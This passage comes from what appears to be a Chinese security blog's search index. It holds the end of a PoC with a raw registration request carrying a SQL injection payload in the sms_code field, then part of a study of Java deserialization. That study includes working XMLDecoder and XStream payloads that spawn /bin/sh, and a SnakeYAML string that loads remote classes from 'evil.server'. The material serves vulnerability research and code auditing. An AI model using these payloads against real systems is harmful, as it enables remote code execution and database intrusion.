zh - TW ; q = 0.7 , zh - HK ; q = 0.5 , en - US ; q = 0.3 , en ; q = 0.2   Accept - Encoding :   gzip ,   deflate   Content - Type :   multipart / form - data ;   boundary = --------------------------- 7517053542655893771289640773   Content - Length :   1491   Connection :   close   Cookie :   OCSESSID = 10ac6e7a3c082a8ce1a8facbbd ;   language = zh - cn ;   currency = CNY   Upgrade - Insecure - Requests :   1   ----------------------------- 7517053542655893771289640773   Content - Disposition :   form - data ;   name = \" registertype \"   mobile   ----------------------------- 7517053542655893771289640773   Content - Disposition :   form - data ;   name = \" email \"   ----------------------------- 7517053542655893771289640773   Content - Disposition :   form - data ;   name = \" telephone \"   534f3c824a9d63a8   ----------------------------- 7517053542655893771289640773   Content - Disposition :   form - data ;   name = \" sms _ code \"   '   or   ( select   if ( 0 , 1 , ~ 0 + 1 ) )   and   ' ' = '   ----------------------------- 7517053542655893771289640773   Content - Disposition :   form - data ;   name = \" firstname \"   123123   ----------------------------- 7517053542655893771289640773   Content - Disposition :   form - data ;   name = \" lastname \"   ----------------------------- 7517053542655893771289640773   Content - Disposition :   form - data ;   name = \" customer _ group _ id \"   1   ----------------------------- 7517053542655893771289640773   Content - Disposition :   form - data ;   name = \" password \"   123123   ----------------------------- 7517053542655893771289640773   Content - Disposition :   form - data ;   name = \" confirm \"   123123   ----------------------------- 7517053542655893771289640773   Content - Disposition :   form - data ;   name = \" newsletter \"   0   ----------------------------- 7517053542655893771289640773   Content - Disposition :   form - data ;   name = \" captcha \"   4a6b2c   ----------------------------- 7517053542655893771289640773   Content - Disposition :   form - data ;   name = \" agree \"   1   ----------------------------- 7517053542655893771289640773 --","title":"PoC"},{"location":"blog/2019/study-java-deserialized-commonscollections3-1-20191024/","tags":["java"],"text":"0x00   \u524d\u8a00   \u524d\u6bb5 \u65f6\u95f4 \u6bb5\u65f6\u95f4 \u524d\u6bb5\u65f6\u95f4 \u5728 \u590d\u73b0 shiro \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u6f0f\u6d1e \u7684 \u8fc7\u7a0b \u4e2d \uff0c \u53d1\u73b0 \u65e0\u6cd5 \u5f88 \u597d \u7684 \u7406\u89e3 CommonCollections4 \u4ec0\u4e48 \u4e3a\u4ec0\u4e48 \u65e0\u6cd5 \u6267\u884c \u547d\u4ee4 \u6267\u884c\u547d\u4ee4 \uff0c \u8fd8\u662f \u7f3a\u5c11 Java \u7684 \u4e00\u4e9b \u57fa\u7840 \u77e5\u8bc6 \u57fa\u7840\u77e5\u8bc6 \u3002 \u6240\u4ee5 \u8fd9\u91cc \u5c31 \u5148 \u505c\u4e0b \u4e86 \u590d\u73b0 \u6f0f\u6d1e \u7684 \u8fdb\u7a0b \uff0c \u5148 \u5c06 \u57fa\u7840 \u6253 \u624e\u5b9e \uff1a \uff09 \u3002 \u8fd9 \u6587\u7ae0 \u7bc7\u6587\u7ae0 \u5c06 \u8bb0\u5f55 \uff0c Java \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u6f0f\u6d1e \u7684 \u539f\u7406 \u4ee5\u53ca \u6d4b\u8bd5 \u73af\u5883 \u6d4b\u8bd5\u73af\u5883 \u3002   \u53c2\u8003 \u6587\u732e \u53c2\u8003\u6587\u732e \u90fd \u5d4c\u5165 \u5728 \u6587\u4e2d \u3002   0x01   \u57fa\u7840 \u77e5\u8bc6 \u57fa\u7840\u77e5\u8bc6   1 .   Java \u4e2d \u7684 \u5e8f\u5217 \u5e8f\u5217\u5316 \u548c \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316   \u5e8f\u5217 \u5e8f\u5217\u5316 \uff1a \u4f7f\u7528   ObjectOutputStream   \u7c7b \u7684   writeObject   \u51fd\u6570   public   final   void   writeObject   (   Object   x   )   throws   IOException   \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \uff1a \u4f7f\u7528   ObjectInputStream   \u7c7b \u7684   readObject   \u51fd\u6570   public   final   Object   readObject   ( )   throws   IOException   ,   ClassNotFoundException   \u652f\u6301 \u5e8f\u5217 \u5e8f\u5217\u5316 \u7684 \u5bf9\u8c61 \u5fc5\u987b \u6ee1\u8db3 \uff1a   \u5b9e\u73b0 \u4e86   java . io . Serializable   \u63a5\u53e3   \u5f53\u524d \u5bf9\u8c61 \u7684 \u6240\u6709 \u7c7b \u5c5e\u6027 \u53ef \u5e8f\u5217 \u5e8f\u5217\u5316 \uff0c \u5982\u679c \u6709 \u4e00\u4e2a \u5c5e\u6027 \u4e0d\u60f3 \u6216 \u4e0d\u80fd \u88ab \u5e8f\u5217 \u5e8f\u5217\u5316 \uff0c \u5219 \u9700\u8981 \u6307\u5b9a   transient   \uff0c \u4f7f\u5f97 \u8be5 \u5c5e\u6027 \u5c06 \u4e0d\u4f1a \u88ab \u5e8f\u5217 \u5e8f\u5217\u5316   \u4e3e\u4e2a \u4f8b\u5b50 ( \u6765\u6e90 \u6e90\u4e8e \u6765\u6e90\u4e8e   \u6b64\u5904   )   public   class   Employee   implements   java   .   io   .   Serializable   {   public   String   name   ;   public   String   address   ;   public   transient   int   SSN   ;   public   int   number   ;   public   void   mailCheck   ( )   {   System   .   out   .   println   (   \" Mailing   a   check   to   \"   +   name   +   \"   \"   +   address   ) ;   }   }   import   java . io . *   ;   public   class   SerializeDemo   {   public   static   void   main   (   String   [ ]   args   )   {   Employee   e   =   new   Employee   ( ) ;   e   .   name   =   \" Reyan   Ali \"   ;   e   .   address   =   \" Phokka   Kuan ,   Ambehta   Peer \"   ;   e   .   SSN   =   11122333   ;   e   .   number   =   101   ;   try   {   FileOutputStream   fileOut   =   new   FileOutputStream   (   \" / tmp / employee . ser \"   ) ;   ObjectOutputStream   out   =   new   ObjectOutputStream   (   fileOut   ) ;   out   .   writeObject   (   e   ) ;   out   .   close   ( ) ;   fileOut   .   close   ( ) ;   System   .   out   .   printf   (   \" Serialized   data   is   saved   in   / tmp / employee . ser \"   ) ;   }   catch   (   IOException   i   )   {   i   .   printStackTrace   ( ) ;   }   }   }   \u8fd0\u884c \u540e \uff0c \u751f\u6210 employee . ser   \u6839\u636e   \u5e8f\u5217 \u5e8f\u5217\u5316 \u89c4\u8303   \uff0c   aced   \u4ee3\u8868 java \u5e8f\u5217 \u5e8f\u5217\u5316 \u6570\u636e \u7684 magic   word   STREAM _ MAGIC   ,   0005   \u8868\u793a \u7248\u672c \u7248\u672c\u53f7   STREAM _ VERSION   ,   73   \u8868\u793a \u662f \u4e00\u4e2a \u5bf9\u8c61   TC _ OBJECT   ,   72   \u8868\u793a \u8fd9\u4e2a \u5bf9\u8c61 \u7684 \u63cf\u8ff0   TC _ CLASSDESC   \u6240\u4ee5 \u5728 \u65e5\u5e38 \u6d4b\u8bd5 \u4e2d \uff0c \u5982\u679c \u89e3\u5f00 \u7c7b\u4f3c Base64 \u540e \uff0c \u8d77\u59cb \u4e3a aced \u6253\u5934 \uff0c \u53ef\u4ee5 \u5c1d\u8bd5 \u4f7f\u7528 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u7684 payload \u3002   \u5728 \u5bf9 \u5176 \u505a \u5b8c \u5e8f\u5217 \u5e8f\u5217\u5316 \u64cd\u4f5c \u540e \uff0c \u6211\u4eec \u5728 \u53e6 \u4e00\u4e2a JVM \u4e2d \u6062\u590d \u8be5 \u5bf9\u8c61 \uff0c \u9700\u8981 \u7528\u5230   ObjectInputStream   import   java . io . *   ;   public   class   DeserializeDemo   {   public   static   void   main   (   String   [ ]   args   )   {   Employee   e   =   null   ;   try   {   FileInputStream   fileIn   =   new   FileInputStream   (   \" / tmp / employee . ser \"   ) ;   ObjectInputStream   in   =   new   ObjectInputStream   (   fileIn   ) ;   e   =   (   Employee   )   in   .   readObject   ( ) ;   in   .   close   ( ) ;   fileIn   .   close   ( ) ;   }   catch   (   IOException   i   )   {   i   .   printStackTrace   ( ) ;   return   ;   }   catch   (   ClassNotFoundException   c   )   {   System   .   out   .   println   (   \" Employee   class   not   found \"   ) ;   c   .   printStackTrace   ( ) ;   return   ;   }   System   .   out   .   println   (   \" Deserialized   Employee ... \"   ) ;   System   .   out   .   println   (   \" Name :   \"   +   e   .   name   ) ;   System   .   out   .   println   (   \" Address :   \"   +   e   .   address   ) ;   System   .   out   .   println   (   \" SSN :   \"   +   e   .   SSN   ) ;   System   .   out   .   println   (   \" Number :   \"   +   e   .   number   ) ;   }   }   readObject   \u51fd\u6570 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u4e86 \u4e0a\u9762 \u4ea7\u751f \u7684 \u8fdb\u5236 \u4e8c\u8fdb\u5236 \u6570\u636e \u6570\u636e\u6d41 \uff0c \u751f\u6210 \u4e86 \u539f\u6709 \u7684 \u5bf9\u8c61 \u6570\u636e \u7ed3\u6784 \u6570\u636e\u7ed3\u6784 \u3002 \u9700\u8981 \u6ce8\u610f \u7684 \u662f \uff0c \u7531\u4e8e SSN \u4e3a transient \uff0c \u5176 \u65e0\u6cd5 \u5e8f\u5217 \u5e8f\u5217\u5316 \uff0c \u6240\u4ee5 \u8fd8\u539f \u540e \u5176\u503c \u4e3a 0 \u3002   \u5982\u679c \u5728 \u5f85 \u5e8f\u5217 \u5e8f\u5217\u5316 \u7c7b\u4e0a \u5b9e\u73b0 \u4e86 readObject \u51fd\u6570 \uff0c \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u8fc7\u7a0b \u4e2d \u4f1a \u81ea\u52a8 \u8c03\u7528 \u8be5\u7c7b \u7684 readObject \u51fd\u6570 \u3002   \u4f8b\u5982 \u5728 Employee \u7c7b\u4e2d \u6dfb\u52a0 \u51fd\u6570 readObject   private   void   readObject   (   ObjectInputStream   in   )   throws   Exception   {   in   .   defaultReadObject   ( ) ;   System   .   out   .   println   (   \" Employee   call   readObject   Function \"   ) ;   }   \u5728 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u8fc7\u7a0b \u4e2d\u5c06 \u8fc7\u7a0b\u4e2d\u5c06 \u8c03\u7528 \u8be5 \u51fd\u6570   2 .   \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u89e6\u53d1 \u70b9 \u6269\u5c55   \u4e0a\u9762 \u5c55\u793a \u4e86 \u5e8f\u5217 \u5e8f\u5217\u5316 \u548c \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u7684 \u539f\u7406 \uff0c \u5e76\u4e14 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u7684 \u89e6\u53d1 \u70b9\u4e3a   ObjectInputStream . readObject   \u3002 \u90a3\u4e48 \u95ee\u9898 \u6765 \u4e86 \uff0c \u662f\u5426 Java \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u53ea\u80fd \u7531\u8be5 \u70b9 \u89e6\u53d1 \uff1f \u7b54\u6848 \u5f53\u7136 \u662f \u5426\u5b9a \u7684 \u3002   \u9664\u4e86 \u4e0a\u9762 \u7684 \u65b9\u6cd5 \u5916 \uff0c \u8fd8\u6709 \u5982\u4e0b \u51e0\u79cd \u89e6\u53d1 \u65b9\u5f0f \uff1a   ObjectInputStream   .   readObject   / /   \u6d41 \u8f6c\u5316 \u4e3a Object   ObjectInputStream   .   readUnshared   / /   \u6d41 \u8f6c\u5316 \u4e3a Object   XMLDecoder   .   readObject   / /   \u8bfb\u53d6 xml \u8f6c\u5316 \u4e3a Object   Yaml   .   load   / /   yaml \u5b57\u7b26 \u5b57\u7b26\u4e32 \u8f6c Object   XStream   .   fromXML   / /   XStream \u7528\u4e8e Java   Object \u4e0e xml \u76f8\u4e92 \u8f6c\u5316   ObjectMapper   .   readValue   / /   jackson \u4e2d \u7684 api   JSON   .   parseObject   / /   fastjson \u4e2d \u7684 api   Note :   \u5bf9\u4e8e readUnshared \u51fd\u6570 \uff0c \u5176 \u4e0e readObject \u51fd\u6570 \u7684 \u533a\u522b \u6682\u65f6 \u8fd8 \u6ca1 \u5f04 \u660e\u767d \uff0c \u5f15\u7528 \u7f51\u4e0a \u7684 \u89e3\u91ca   readUnshared \u65b9\u6cd5 \u8bfb\u53d6 \u5bf9\u8c61 \uff0c \u4e0d \u5141\u8bb8 \u540e\u7eed \u7684 readObject \u548c readUnshared \u8c03\u7528 \u5f15\u7528 \u8fd9\u6b21 \u8c03\u7528 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5f97\u5230 \u7684 \u5bf9\u8c61 \uff0c \u800c readObject \u8bfb\u53d6 \u7684 \u5bf9\u8c61 \u53ef\u4ee5 \u3002   \u4f46 \u5176 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u8fc7\u7a0b \u4e2d \u4ecd\u7136 \u53ef\u4ee5 \u89e6\u53d1 readObject \u7684 \u8c03\u7528 \uff0c \u6709\u5f85 \u5f04\u6e05 \u6e05\u695a \u5f04\u6e05\u695a \u3002   3 .   \u6269\u5c55 \u89e6\u53d1 \u70b9 \u8bd5\u9a8c   readUnshared   \u51fd\u6570 \u7684 \u4f7f\u7528 \u65b9\u5f0f \u540c   readObject   \u7c7b\u4f3c \uff0c \u8fd9\u91cc \u4e0d\u518d \u53d9\u8ff0 \u3002 \u8fd9\u4e00 \u5c0f\u8282 \u4e3b\u8981 \u8bb2 \u5404\u79cd \u89e6\u53d1 \u70b9 \u7684 \u5229\u7528 \u65b9\u5f0f \uff0c \u4e0d \u8bb2 \u5177\u4f53 \u7684 \u539f\u7406 \u3002 \u539f\u7406 \u90e8\u5206 \u7559 \u5230 \u540e\u9762 \u5206\u6790 \u3002   a .   XMLDecoder . readObject   public   static   void   main   (   String   [ ]   args   ) {   String   poc   =   \" poc . xml \"   ;   try   {   FileInputStream   file   =   new   FileInputStream   (   poc   ) ;   XMLDecoder   decoder   =   new   XMLDecoder   (   file   ) ;   decoder   .   readObject   ( ) ;   decoder   .   close   ( ) ;   }   catch   (   FileNotFoundException   e   )   {   e   .   printStackTrace   ( ) ;   }   }   poc . xml   < ? xml   version = \" 1.0 \"   encoding = \" UTF - 8 \" ? >   < java >   < object   class =   \" java . lang . ProcessBuilder \"   >   < array   class =   \" java . lang . String \"   length =   \" 3 \"   >   < void   index =   \" 0 \"   >   < string >   / bin / sh   < / string >   < / void >   < void   index =   \" 1 \"   >   < string >   - c   < / string >   < / void >   < void   index =   \" 2 \"   >   < string >   open   / Applications / Calculator . app   < / string >   < / void >   < / array >   < void   method =   \" start \"   / >   < / object >   < / java >   \u6700\u7ec8 \u53ef \u89e6\u53d1 \u547d\u4ee4 \u6267\u884c   b .   Yaml . load   \u53c2\u8003 \u94fe\u63a5   \uff0c \u8fd9\u91cc \u6682\u672a \u8bd5\u9a8c   \u6dfb\u52a0 SnakeYAML \u5e93   < ! --   https : / / mvnrepository . com / artifact / org . yaml / snakeyaml   -- >   < dependency >   < groupId >   org . yaml   < / groupId >   < artifactId >   snakeyaml   < / artifactId >   < version >   1.25   < / version >   < / dependency >   public   static   void   main   (   String   [ ]   args   )   {   String   yamlStr   =   \" ! ! javax . script . ScriptEngineManager   [ ! ! java . net . URLClassLoader   \"   +   \" [ [ ! ! java . net . URL   [ \\ \" http : / / evil . server \\ \" ] ] ] ] \"   ;   Yaml   yaml   =   new   Yaml   ( ) ;   Object   obj   =   yaml   .   load   (   yamlStr   ) ;   }   \u8fd9\u91cc \u7684 yamlStr \u53ef\u4ee5 \u7528 https : / / github . com / mbechler / marshalsec \u751f\u6210 \u5371\u5bb3 \u66f4\u5927 \u7684 payload   c .   XStream . fromXML   \u53c2\u8003 \u94fe\u63a5   \u6dfb\u52a0 XStream \u5e93   < dependency >   < groupId >   com . thoughtworks . xstream   < / groupId >   < artifactId >   xstream   < / artifactId >   < version >   1.4 . 10   < / version >   < / dependency >   public   static   void   main   (   String   [ ]   args   )   {   / /   expGen ( ) ;   String   payload   =   \" < sorted - set > \\ n \"   +   \"   < string > foo < / string > \\ n \"   +   \"   < dynamic - proxy > \\ n \"   +   \"   < interface > java . lang . Comparable < / interface > \\ n \"   +   \"   < handler   class = \\ \" java . beans . EventHandler \\ \" > \\ n \"   +   \"   < target   class = \\ \" java . lang . ProcessBuilder \\ \" > \\ n \"   +   \"   < command > \\ n \"   +   \"   < string > / bin / sh < / string > \\ n \"   +   \"   < string > - c < / string > \\ n \"   +   \"   < string > open   / System / Applications / Calculator . app < / string > \\ n \"   +   \"   < / command > \\ n \"   +   \"   < / target > \\ n \"   +   \"   < action > start < / action > \"   +   \"   < / handler > \\ n \"   +   \"   < / dynamic - proxy > \\ n \"   +   \" < / sorted - set > \\ n \"   ;   XStream   xStream   =   new   XStream   ( ) ;   xStream   .   fromXML   (   payload   ) ;   }   d .   \u4e0a\u9762 \u7684 6 \u548c 7 \uff0c \u7559 \u5230 \u540e\u9762 \u5206\u6790   4 .   \u5c0f\u7ed3   \u4e0a\u9762 \u4e24\u8282 \u4ecb\u7ecd \u4e86 Java \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u7684 \u539f\u7406 \uff0c \u5e76 \u6269\u5c55 \u4e86 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u7684 \u89e6\u53d1 \u70b9 \u3002 \u5728 \u5b9e\u9645 \u7684 \u5ba1\u8ba1 \u8fc7\u7a0b \u4e2d \uff0c \u53ef\u4ee5 \u76f4\u63a5 \u5173\u6ce8 \u8fd9\u4e9b \u51fd\u6570 \u7684 \u8c03\u7528   (   readObject   |   readUnshared   |   load   |   fromXML   |   readValue   |   parseObject   )   \\   s   *   \\   (   \u5f53\u7136 \u6709\u4e9b \u8fd8 \u9700\u8981 \u770b \u662f\u5426 \u662f\u5426\u662f \u6709 \u6f0f\u6d1e \u7684 \u7248\u672c   0x02   \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u8fc7\u7a0b   \u4e0a\u9762 \u5927\u81f4 \u8bb2\u8bc9 \u4e86 \u5e8f\u5217 \u5e8f\u5217\u5316 \u548c \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u7684 \u4f7f\u7528 \u65b9\u6cd5 \uff0c \u672c\u8282 \u5c06 \u8c03\u8bd5 \u4e0a\u9762 \u7684   Employee   \u6848\u4f8b \uff0c \u6765 \u770b\u770b \u5728 \u4ee3\u7801 \u5c42\u9762 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u8fc7\u7a0b \u662f \u600e\u4e48 \u600e\u4e48\u6837 \u7684 \uff01   \u8fd9\u91cc \u4f7f\u7528 \u7684 \u662f   ObjectInputStream   \u7684 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u65b9\u6cd5   readObject   \u51fd\u6570   \u5176\u5b9e \u6574\u4e00 \u4e00\u4e2a \u6574\u4e00\u4e2a \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u8fc7\u7a0b \u603b\u4f53 \u6765\u8bf4 \u5206\u4e3a \u4e24\u6b65 \uff0c \u4ece \u5b57\u7b26 \u5b57\u7b26\u4e32 \u6d41\u4e2d \u6839\u636e \u5e8f\u5217 \u5e8f\u5217\u5316 \u89c4\u683c \u63d0\u53d6 \u51fa \u53ef\u80fd \u7684 \u7c7b \uff0c \u7136\u540e \u5c06 \u8be5\u7c7b \u4f7f\u7528 \u53cd\u5c04 \u673a\u5236 \u67e5\u627e \u6216 \u521b\u5efa \u4e00\u4e2a \u5b9e\u4f8b \u3002 \u5176\u4e2d \u4e5f \u4f1a \u6709 \u4e00\u4e9b \u68c0\u67e5 \u7684 \u8fc7\u7a0b \uff0c \u8fd9\u91cc \u4f8b\u5b50 \u6bd4\u8f83 \u7b80\u5355 \u6bd4\u8f83\u7b80\u5355 \uff0c \u4e0d \u53d9\u8ff0 \u3002   \u6765\u770b \u4e00\u4e0b \u67e5\u627e \u6216 \u521b\u5efa \u7684 \u8fc7\u7a0b   ObjectInputStream : readObject : 417   \u8ddf\u8fdb ObjectInputStream \u7684 readObject \u7c7b \uff0c \u8be5 \u51fd\u6570 \u4f53\u73b0 \u4e86 \u6574\u4e2a \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u7684 \u8fc7\u7a0b \uff0c \u5176\u4e2d \u5176 \u4e3b\u8981 \u529f\u80fd \u7684 \u662f   readObject0   \u51fd\u6570   ObjectInputStream : readObject0 : 1515   \u4ece\u6d41 \u4e2d\u8bfb \u53d6\u51fa \u5f53\u524d \u7684 \u7c7b\u578b \uff0c   tc = 115   \u6b64\u65f6 \u4ee3\u8868 Object \u5bf9\u8c61 \uff0c \u4ece\u800c \u8fdb\u5165   readOrdinaryObject   ObjectInputStream : readOrdinaryObject : 2026   \u8be5 \u51fd\u6570 \u4e3b\u8981 \u505a \u4e86 \u5b9e\u4f8b \u5316 \u5bf9\u8c61 \u7684 \u5de5\u4f5c \uff0c \u5176\u4e2d 2033 \u884c \u751f\u6210 \u7684 ObjectStreamClass \u5bf9\u8c61 \uff0c \u4f1a \u5229\u7528 \u53cd\u5c04 \u673a\u5236 \u5b9e\u4f8b \u5316 \u5e8f\u5217 \u5e8f\u5217\u5316 \u6d41\u4e2d \u7684 \u5bf9\u8c61 \u3002 2044 \u884c \u5b9e\u9645 \u7684 \u83b7\u53d6 \u5230 \u8be5 \u5bf9\u8c61 \u3002   \u5173\u4e8e ObjectStreamClass \u7684 \u529f\u80fd \uff0c \u5b83 \u662f \u7c7b \u7684 \u5e8f\u5217 \u5e8f\u5217\u5316 \u63cf\u8ff0 \u5668 \uff0c \u5305\u542b \u7c7b \u7684 \u540d\u5b57 \u548c \u5e8f\u5217 \u7248\u672c \u7248\u672c\u53f7 \u3002 \u4f7f\u7528 \u5b83 \u7684 lookup \u51fd\u6570 \u53ef\u4ee5 \u8f7d\u5165 \u6216 \u65b0\u5efa \u8be5\u7c7b \uff0c \u4f46 \u8fd9\u91cc \u5b9e\u9645 \u5b9e\u9645\u4e0a \u7528 \u7684 \u662f newInstance \u6765 \u5b9e\u4f8b \u5316 \u5f53\u524d \u7684 \u5e8f\u5217 \u5e8f\u5217\u5316 \u63cf\u8ff0 \u5668 \uff0c \u5373 \u4ea7\u751f \u5f53\u524d \u63cf\u8ff0 \u5668 \u6307\u4ee3 \u7684 \u7c7b \u3002   Serialization ' s   descriptor   for   classes .   It   contains   the   name   and   serialVersionUID   of   the   class .   The   ObjectStreamClass   for   a   specific   class   loaded   in   this   Java   VM   can   be   found / created   using   the   lookup   method .   \u5176\u4e2d \u51fd\u6570   readClassDesc   \u5c06 \u4ece \u5e8f\u5217 \u5e8f\u5217\u5316 \u6d41\u4e2d \u63d0\u53d6 \u51fa \u76f8\u5173 \u7684 \u7c7b \u4fe1\u606f \u3002 \u8fd9\u91cc \u5c31 \u76f4\u63a5 \u770b \u5229\u7528 \u53cd\u5c04 \u673a\u5236 \u83b7\u53d6 \u5230 \u7c7b \u7684 \u5730\u65b9 \uff0c \u4f4d\u4e8e   ObjectInputStream . resolveClass   \uff0c \u4e0b\u56fe \u4e3a \u8c03\u7528 \u94fe   ObjectInputStream : resolveClass : 677   \u8fd9\u91cc \u63d0\u53d6 \u4e86 jvm \u4e2d \u5f53\u524d \u8fd9\u4e2a \u6d41\u4e2d \u7684 \u7c7b \u7684 Class \u5bf9\u8c61 \uff0c \u7528\u4e8e \u540e\u7eed \u7684 newInstance \u3002   \u6b64\u5904 \u6574\u4e00 \u4e00\u4e2a \u6574\u4e00\u4e2a \u53cd\u5c04 \u5c31\u662f \u5148 \u901a\u8fc7   Class . forName   \u83b7\u53d6 \u5230 \u5f53\u524d \u63cf\u8ff0 \u5668 \u6240\u6307 \u4ee3 \u7684 \u7c7b \u7684 Class \u5bf9\u8c61 \uff0c \u540e\u7eed \u4f1a \u5728   initNonProxy   \u6216   initProxy   \u51fd\u6570 \u4e2d \u590d\u5236 \u8be5 Class \u5bf9\u8c61 \u7684 \u76f8\u5173 \u4fe1\u606f ( \u5305\u62ec \u76f8\u5173 \u51fd\u6570 ) \uff0c \u6700\u540e \u5728 2044 \u884c\u5904   ObjectStreamClass . newInstance   \u5b9e\u4f8b \u5316\u8be5 \u5bf9\u8c61 \u3002   \u5728 \u5b9e\u4f8b \u5316\u540e \u4f1a\u7528   ObjectInputStream . readSerialData   \u51fd\u6570 \u5c06 \u5e8f\u5217 \u5e8f\u5217\u5316 \u6d41\u4e2d \u7684 \u76f8\u5173 \u6570\u636e \u586b\u5145 \u8fdb \u5b9e\u4f8b \u5316\u540e \u7684 \u5bf9\u8c61 \u4e2d \u6216 \u8c03\u7528 \u5f53\u524d \u7c7b \u63cf\u8ff0 \u5668 \u7684 readObject \u51fd\u6570 \u3002   ObjectInputStream : readSerialData : 2149   \u8fd9\u91cc \u4f1a \u6839\u636e \u5f53\u524d \u7684 \u7c7b \u63cf\u8ff0 \u5668 \u662f\u5426 \u5b58\u5728 readObject \u51fd\u6570 \u6765 \u81ea\u52a8 \u8c03\u7528 \u8be5 \u51fd\u6570 \uff0c \u6216\u8005 \u662f \u586b\u5145 \u5e8f\u5217 \u6d41\u4e2d \u7684 field \u6570\u636e \u3002 \u8fd9\u91cc \u7684 readObject \u7684 \u8c03\u7528 \u5e38\u4e3a \u5229\u7528 \u94fe \u7684 \u4e00\u90e8 \u90e8\u5206 \u4e00\u90e8\u5206 \uff0c \u4f8b\u5982 CommonsCollections1 \u4e2d \u7684   AnnotationInvocationHandler   \uff0c \u540e\u6587 \u5c06 \u5206\u6790 \u8be5 \u51fd\u6570 \u3002   \u6ce8\u610f \uff1a \u7531\u4e8e \u6211\u4eec \u7528 \u7684 \u662f Serializable \u63a5\u53e3 \uff0c \u6240\u4ee5 \u4e0a\u8ff0 \u5e76\u672a \u63d0\u53ca \u4f7f\u7528 Externalizable \u63a5\u53e3 \u7684 \u60c5\u51b5 \u3002   \u6b64\u4e3a \u4e3a\u6b62 \u5230\u6b64\u4e3a\u6b62 \uff0c \u6700\u540e \u8fd4\u56de \u7684 \u5bf9\u8c61 \u5c31\u662f \u6700\u7ec8 \u6211\u4eec \u5f97\u5230 \u7684 \u5e8f\u5217 \u5e8f\u5217\u5316 \u524d \u7684 \u5bf9\u8c61 \u3002   \u5c0f\u7ed3   \u8fd9\u91cc \u5f15\u7528   \u6d45\u8c08 Java \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u6f0f\u6d1e \u4fee\u590d \u65b9\u6848   Java \u7a0b\u5e8f \u4e2d\u7c7b ObjectInputStream \u7684 readObject \u65b9\u6cd5 \u88ab \u7528\u6765 \u5c06 \u6570\u636e \u6570\u636e\u6d41 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u4e3a \u5bf9\u8c61 \uff0c \u5982\u679c \u6d41\u4e2d \u7684 \u5bf9\u8c61 \u662f class \uff0c \u5219 \u5b83 \u7684 ObjectStreamClass \u63cf\u8ff0 \u63cf\u8ff0\u7b26 \u4f1a \u88ab \u8bfb\u53d6 \uff0c \u5e76 \u8fd4\u56de \u76f8\u5e94 \u7684 class \u5bf9\u8c61 \uff0c ObjectStreamClass \u5305\u542b \u4e86 \u7c7b \u7684 \u540d\u79f0 \u53ca serialVersionUID \u3002   \u5982\u679c \u7c7b \u63cf\u8ff0 \u63cf\u8ff0\u7b26 \u662f \u52a8\u6001 \u4ee3\u7406 \u7c7b \uff0c \u5219 \u8c03\u7528 resolveProxyClass \u65b9\u6cd5 \u6765 \u83b7\u53d6 \u672c\u5730 \u7c7b \u3002 \u5982\u679c \u4e0d\u662f \u52a8\u6001 \u4ee3\u7406 \u7c7b\u5219 \u8c03\u7528 resolveClass \u65b9\u6cd5 \u6765 \u83b7\u53d6 \u672c\u5730 \u7c7b \u3002 \u5982\u679c \u65e0\u6cd5 \u89e3\u6790 \u8be5\u7c7b \uff0c \u5219 \u629b\u51fa ClassNotFoundException \u5f02\u5e38 \u3002   \u5982\u679c \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5bf9\u8c61 \u4e0d\u662f String \u3001 array \u3001 enum \u7c7b\u578b \uff0c ObjectStreamClass \u5305\u542b \u7684 \u7c7b\u4f1a \u5728 \u672c\u5730 \u88ab \u68c0\u7d22 \uff0c \u5982\u679c \u8fd9\u4e2a \u672c\u5730 \u7c7b \u6ca1\u6709 \u5b9e\u73b0 java . io . Serializable \u6216\u8005 externalizable \u63a5\u53e3 \uff0c \u5219 \u629b\u51fa InvalidClassException \u5f02\u5e38 \u3002 \u56e0\u4e3a \u53ea\u6709 \u5b9e\u73b0 \u4e86 Serializable \u548c Externalizable \u63a5\u53e3 \u7684 \u7c7b \u7684 \u5bf9\u8c61 \u624d\u80fd \u88ab \u5e8f\u5217 \u5e8f\u5217\u5316 \u3002   \u524d\u9762 \u5206\u6790 \u4e2d \u63d0\u5230 \u6700\u540e \u4f1a \u8c03\u7528   resolveClass   \u83b7\u53d6 \u7c7b \u7684 Class \u5bf9\u8c61 \uff0c \u8fd9 \u662f \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u8fc7\u7a0b \u4e2d \u4e00\u4e2a \u91cd\u8981 \u7684 \u5730\u65b9 \uff0c \u4e5f \u662f \u5fc5\u7ecf \u4e4b\u8def \u5fc5\u7ecf\u4e4b\u8def \uff0c \u6240\u4ee5 \u6709 \u7814\u7a76 \u4eba\u5458 \u63d0\u51fa \u901a\u8fc7 \u91cd\u8f7d   ObjectInputStream   \u7684   resolveClass   \u6765 \u9650\u5236 \u53ef\u4ee5 \u88ab \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u7684 \u7c7b   0x03   \u5229\u7528 \u94fe \u53d1\u6398   \u540c PHP \u7684 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u4e00\u6837 \uff0c \u5355\u5355 \u53d1\u73b0 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u7684 \u89e6\u53d1 \u70b9 \u5e76 \u4e0d\u80fd \u9020\u6210 